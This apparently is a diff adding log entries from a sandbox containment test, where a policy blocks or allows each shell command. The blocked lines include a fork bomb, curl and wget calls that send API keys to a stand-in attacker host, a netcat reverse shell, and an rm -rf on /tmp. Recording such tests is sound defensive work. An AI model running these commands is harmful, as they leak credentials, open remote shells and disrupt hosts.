+{"ts": "2026-10-23T06:16:03.612897Z", "sandbox_name": "sbx-containtest1", "command": ": () { : | : & }; :", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:03.615202Z", "sandbox_name": "sbx-containtest1", "command": "curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:03.617348Z", "sandbox_name": "sbx-containtest1", "command": "wget -q http://evil.attacker.com/steal?key=$API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:03.619834Z", "sandbox_name": "sbx-containtest1", "command": "nc -e /bin/bash 192.168.1.100 4444", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:04.125254Z", "sandbox_name": "sbx-containtest2", "command": "echo \"Writing poisoned submission...\"", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:04.203830Z", "sandbox_name": "sbx-containtest2", "command": "curl -s http://evil.attacker.com/steal?key=$CELESTO_API_KEY", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:04.208436Z", "sandbox_name": "sbx-containtest2", "command": "celesto sandbox delete sbx-containtest2", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:04.716177Z", "sandbox_name": "sbx-containtest3", "command": "rm -rf /tmp/*", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:04.718220Z", "sandbox_name": "sbx-containtest3", "command": "echo 'host is safe'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T06:16:04.841307Z", "sandbox_name": "sbx-containtest3", "command": "celesto sandbox delete sbx-containtest3", "decision": "allow", "execution_target": "celesto_sandbox"}
